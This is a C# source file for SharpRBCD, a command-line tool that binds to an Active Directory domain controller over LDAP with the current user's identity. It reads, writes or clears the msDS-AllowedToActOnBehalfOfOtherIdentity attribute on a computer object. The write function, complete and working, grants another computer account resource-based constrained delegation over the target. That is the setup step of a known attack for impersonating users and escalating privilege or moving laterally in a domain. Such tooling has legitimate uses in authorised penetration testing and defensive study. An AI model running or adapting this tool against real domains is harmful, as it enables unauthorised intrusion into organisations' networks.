using System;
using System.DirectoryServices.Protocols;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;


// Author: Mark Pralat @markpralat | @Kryp7os
// SharpRBCD prepares an object for RBCD by adding the msds-AllowedToActOnBehalfOfOtherIdentity attribute using the current user's identity

class RBCD_SSO
{
    enum ActionType { Read, Write, Clear }

    static void PrintUsage()
    {
        Console.WriteLine("Usage: SharpRBCD.exe -action <read|write|clear> -delegateFrom <COMPUTER$> -delegateTo <COMPUTER$> [options]");
        Console.WriteLine("  -dc <hostname>  [Optional] Hostname/FQDN of Domain Controller (defaults to auto-discovery)");
        Console.WriteLine();
        Console.WriteLine("Examples:");
        Console.WriteLine("  SharpRBCD.exe -action read  -delegateTo SRV-2$");
        Console.WriteLine("  SharpRBCD.exe -action write -delegateFrom WKSTN-2$ -delegateTo SRV-2$ -dc dc01.company.local");
        Console.WriteLine("  SharpRBCD.exe -action clear -delegateTo SRV-2$");
        Environment.Exit(1);
    }

    static void Main(string[] args)
    {
        string dcHost = null;
        string delegateFrom = null;
        string delegateTo = null;
        ActionType action = ActionType.Write; // default to 'write' if not provided

        // Parse command-line
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i].Equals("-dc", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
            {
                dcHost = args[++i];
            }
            else if (args[i].Equals("-delegateFrom", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
            {
                delegateFrom = args[++i];
            }
            else if (args[i].Equals("-delegateTo", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
            {
                delegateTo = args[++i];
            }
            else if (args[i].Equals("-action", StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
            {
                string a = args[++i].ToLower();
                switch (a)
                {
                    case "read":
                        action = ActionType.Read;
                        break;
                    case "write":
                        action = ActionType.Write;
                        break;
                    case "clear":
                        action = ActionType.Clear;
                        break;
                    default:
                        Console.WriteLine("[!] Invalid action: {0}", a);
                        PrintUsage();
                        break;
                }
            }
        }

        // Validate minimal arguments
        if (string.IsNullOrEmpty(delegateTo))
        {
            Console.WriteLine("[!] Missing required -delegateTo <COMPUTER$>.");
            PrintUsage();
        }

        // For 'write', we also need delegateFrom
        if (action == ActionType.Write && string.IsNullOrEmpty(delegateFrom))
        {
            Console.WriteLine("[!] -action write requires -delegateFrom <COMPUTER$>.");
            PrintUsage();
        }

        Console.WriteLine("[*] Action      : {0}", action);
        if (!string.IsNullOrEmpty(dcHost))
            Console.WriteLine("[*] Using DC host: {0}", dcHost);
        else
            Console.WriteLine("[*] No DC specified; will rely on DNS/LDAP auto-discovery.\n");

        Console.WriteLine("[*] Delegate-To : {0}", delegateTo);
        if (action == ActionType.Write)
            Console.WriteLine("[*] Delegate-From: {0}", delegateFrom);

        try
        {
            // 1) Create LDAP connection
            //    If dcHost is specified, connect there; otherwise auto-discover.
            LdapDirectoryIdentifier identifier;
            if (!string.IsNullOrEmpty(dcHost))
            {
                identifier = new LdapDirectoryIdentifier(dcHost, 389);
            }
            else
            {
                // Null indicates "use default DC location"
                identifier = new LdapDirectoryIdentifier((string)null, false, false);
            }

            using (LdapConnection conn = new LdapConnection(identifier))
            {
                conn.AuthType = AuthType.Negotiate; // uses current user context (SSPI)
                conn.SessionOptions.ProtocolVersion = 3;

                Console.WriteLine("\n[*] Binding via Negotiate (Kerberos if available)...");
                conn.Bind(); // uses current user’s TGT if present
                Console.WriteLine("[*] LDAP bind successful.\n");

                // 2) Get defaultNamingContext from RootDSE
                string defaultNC = GetDefaultNamingContext(conn);
                if (string.IsNullOrEmpty(defaultNC))
                {
                    Console.WriteLine("[!] Could not retrieve defaultNamingContext.");
                    return;
                }
                Console.WriteLine("[*] defaultNamingContext: {0}", defaultNC);

                // 3) Find DN of delegateTo
                string toDN = GetDNforSamAccountName(conn, defaultNC, delegateTo);
                if (string.IsNullOrEmpty(toDN))
                {
                    Console.WriteLine("[!] Could not find sAMAccountName={0}", delegateTo);
                    return;
                }
                Console.WriteLine("[*] Delegate-To DN: {0}", toDN);

                // 4) Handle the chosen action
                switch (action)
                {
                    case ActionType.Read:
                        ReadMsDSAllowedToAct(conn, toDN);
                        break;

                    case ActionType.Write:
                        WriteMsDSAllowedToAct(conn, defaultNC, delegateFrom, toDN);
                        break;

                    case ActionType.Clear:
                        ClearMsDSAllowedToAct(conn, toDN);
                        break;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Exception: " + ex.Message);
        }
    }

    //----------------------------------------------
    // Methods for reading, writing, clearing
    //----------------------------------------------

    static void ReadMsDSAllowedToAct(LdapConnection conn, string computerDN)
    {
        Console.WriteLine("[*] Reading msDS-AllowedToActOnBehalfOfOtherIdentity from: {0}", computerDN);

        SearchRequest req = new SearchRequest(
            computerDN,
            "(objectClass=computer)",
            SearchScope.Base,
            new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" }
        );
        SearchResponse resp = (SearchResponse)conn.SendRequest(req);

        if (resp.Entries.Count < 1)
        {
            Console.WriteLine("[-] No entries found for {0}", computerDN);
            return;
        }

        var entry = resp.Entries[0];
        if (!entry.Attributes.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
        {
            Console.WriteLine("[-] msDS-AllowedToActOnBehalfOfOtherIdentity not set.");
            return;
        }

        byte[] sdBytes = (byte[])entry.Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0];
        Console.WriteLine("[+] msDS-AllowedToActOnBehalfOfOtherIdentity is present ({0} bytes).", sdBytes.Length);

        // Optional: parse it as a RawSecurityDescriptor
        try
        {
            RawSecurityDescriptor rsd = new RawSecurityDescriptor(sdBytes, 0);
            Console.WriteLine("[*] SDDL: {0}", rsd.GetSddlForm(AccessControlSections.All));
        }
        catch
        {
            Console.WriteLine("[!] Could not parse the binary as a RawSecurityDescriptor. Showing Base64 only:");
        }

        // Always show Base64 as well
        string b64 = Convert.ToBase64String(sdBytes);
        Console.WriteLine("[*] Base64: {0}", b64);
    }

    static void WriteMsDSAllowedToAct(LdapConnection conn, string defaultNC, string delegateFrom, string computerDN)
    {
        // 1) Find DN/SID of delegateFrom
        string fromDN = GetDNforSamAccountName(conn, defaultNC, delegateFrom);
        if (string.IsNullOrEmpty(fromDN))
        {
            Console.WriteLine("[!] Could not find sAMAccountName={0}", delegateFrom);
            return;
        }
        Console.WriteLine("[*] Delegate-From DN: {0}", fromDN);

        byte[] fromSidBytes = GetObjectSid(conn, fromDN);
        if (fromSidBytes == null)
        {
            Console.WriteLine("[!] Could not retrieve SID for {0}", fromDN);
            return;
        }
        SecurityIdentifier fromSid = new SecurityIdentifier(fromSidBytes, 0);
        Console.WriteLine("[*] Delegate-From SID: {0}", fromSid.Value);

        // 2) Build SDDL
        string sddl = $"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{fromSid.Value})";
        Console.WriteLine("[*] SDDL: {0}", sddl);

        // 3) Convert to binary
        RawSecurityDescriptor rsd = new RawSecurityDescriptor(sddl);
        byte[] sdBytes = new byte[rsd.BinaryLength];
        rsd.GetBinaryForm(sdBytes, 0);

        // 4) Write to msDS-AllowedToActOnBehalfOfOtherIdentity
        Console.WriteLine("[*] Attempting to set msDS-AllowedToActOnBehalfOfOtherIdentity on: {0}", computerDN);
        ModifyRequest modReq = new ModifyRequest(
            computerDN,
            DirectoryAttributeOperation.Replace,
            "msDS-AllowedToActOnBehalfOfOtherIdentity",
            sdBytes
        );

        ModifyResponse modResp = (ModifyResponse)conn.SendRequest(modReq);
        if (modResp.ResultCode == ResultCode.Success)
        {
            Console.WriteLine("[+] Successfully updated msDS-AllowedToActOnBehalfOfOtherIdentity!");
        }
        else
        {
            Console.WriteLine("[!] Failed: {0} ({1})", modResp.ErrorMessage, modResp.ResultCode);
        }
    }

    static void ClearMsDSAllowedToAct(LdapConnection conn, string computerDN)
    {
        Console.WriteLine("[*] Attempting to CLEAR msDS-AllowedToActOnBehalfOfOtherIdentity on: {0}", computerDN);

        // We can remove the attribute altogether
        ModifyRequest modReq = new ModifyRequest(
            computerDN,
            DirectoryAttributeOperation.Delete,
            "msDS-AllowedToActOnBehalfOfOtherIdentity"
        );

        ModifyResponse modResp = (ModifyResponse)conn.SendRequest(modReq);
        if (modResp.ResultCode == ResultCode.Success)
        {
            Console.WriteLine("[+] Successfully cleared msDS-AllowedToActOnBehalfOfOtherIdentity!");
        }
        else
        {
            Console.WriteLine("[!] Failed: {0} ({1})", modResp.ErrorMessage, modResp.ResultCode);
        }
    }

    //----------------------------------------------
    // Helper methods
    //----------------------------------------------

    // Retrieve defaultNamingContext by querying RootDSE
    static string GetDefaultNamingContext(LdapConnection conn)
    {
        SearchRequest req = new SearchRequest(
            "",
            "(objectClass=*)",
            SearchScope.Base,
            new string[] { "defaultNamingContext" }
        );
        SearchResponse resp = (SearchResponse)conn.SendRequest(req);
        if (resp.Entries.Count > 0)
        {
            var entry = resp.Entries[0];
            if (entry.Attributes.Contains("defaultNamingContext"))
            {
                return entry.Attributes["defaultNamingContext"][0].ToString();
            }
        }
        return null;
    }

    // Look up DN by sAMAccountName
    static string GetDNforSamAccountName(LdapConnection conn, string defaultNC, string samName)
    {
        string filter = $"(sAMAccountName={samName})";
        SearchRequest req = new SearchRequest(
            defaultNC,
            filter,
            SearchScope.Subtree,
            null
        );
        SearchResponse resp = (SearchResponse)conn.SendRequest(req);
        if (resp.Entries.Count > 0)
        {
            return resp.Entries[0].DistinguishedName;
        }
        return null;
    }

    // Return objectSid from an entry's DN
    static byte[] GetObjectSid(LdapConnection conn, string dn)
    {
        SearchRequest req = new SearchRequest(
            dn,
            "(objectClass=*)",
            SearchScope.Base,
            new string[] { "objectSid" }
        );
        SearchResponse resp = (SearchResponse)conn.SendRequest(req);
        if (resp.Entries.Count > 0)
        {
            var entry = resp.Entries[0];
            if (entry.Attributes.Contains("objectSid"))
            {
                return (byte[])entry.Attributes["objectSid"][0];
            }
        }
        return null;
    }
}
